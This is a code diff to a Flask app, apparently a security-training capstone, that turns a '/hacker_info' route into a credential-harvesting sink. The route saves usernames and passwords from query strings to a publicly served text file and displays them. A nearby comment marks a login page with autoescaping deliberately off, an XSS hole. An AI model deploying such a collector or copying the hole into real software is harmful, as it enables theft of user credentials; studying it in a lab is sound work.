@@ -1,3 +1,4 @@
+import os
 import random
 import mysql.connector
 import re
@@ -165,9 +166,17 @@ def phishing():
      
 @app.route('/hacker_info' , methods = ['GET','POST'])
 def hacker_info():
-    print(request.args.get('username'))
-    print(request.args.get('password'))
-    return render_template('hacker_info.html')
+    user = request.args.get('username')
+    password = request.args.get('password')
+    if user:
+        f = open("/var/www/capstone/capstone/static/files/hacked.txt", "a")
+        data = str(user) + " " + str(password) + "\n"
+        f.write(data)
+        f.close()
+    f = open("/var/www/capstone/capstone/static/files/hacked.txt", "r")
+    contents = f.read()
+    f.close()
+    return render_template('hacker_info.html', contents=contents)
 
 # autoescaping is turned off in in login_xss.html
 @app.route('/login_xss', methods = ['GET'])
